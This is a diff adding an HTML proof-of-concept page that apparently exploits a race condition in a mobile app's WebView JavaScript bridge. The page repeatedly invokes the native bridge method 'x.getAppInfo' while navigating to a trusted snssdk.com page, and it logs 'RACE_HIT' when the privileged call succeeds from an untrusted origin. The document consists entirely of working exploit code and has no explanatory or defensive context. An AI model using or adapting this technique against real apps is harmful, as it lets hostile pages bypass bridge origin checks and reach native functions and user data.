@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HG_C1</title>
+</head>
+<body>
+<h1>HG_C1</h1>
+<pre id="out"></pre>
+<script>
+function log(s) {
+  document.getElementById("out").textContent += s + "\n";
+}
+window.JSBridge = {
+  _handleMessageFromApp: function (msg) {
+    var s;
+    try { s = JSON.stringify(msg); } catch (e) { s = String(msg); }
+    log("cb=" + s.slice(0, 400));
+    if (s.indexOf('"code":0') !== -1 || s.indexOf('"code": 0') !== -1) {
+      log("RACE_HIT");
+    }
+  }
+};
+log("href0=" + location.href);
+var n = 0;
+var t = setInterval(function () {
+  n++;
+  if (!window.JS2NativeBridge) return;
+  try {
+    JS2NativeBridge._invokeMethod(JSON.stringify({
+      func: "x.getAppInfo",
+      params: {},
+      __callback_id: "race_" + n
+    }));
+  } catch (e) {}
+  if (n >= 40) clearInterval(t);
+}, 25);
+setTimeout(function () {
+  log("nav");
+  location.href = "https://reading.snssdk.com/reading_offline/drlazy/page/general-rules.html?title=c1race";
+}, 300);
+</script>
+</body>
+</html>
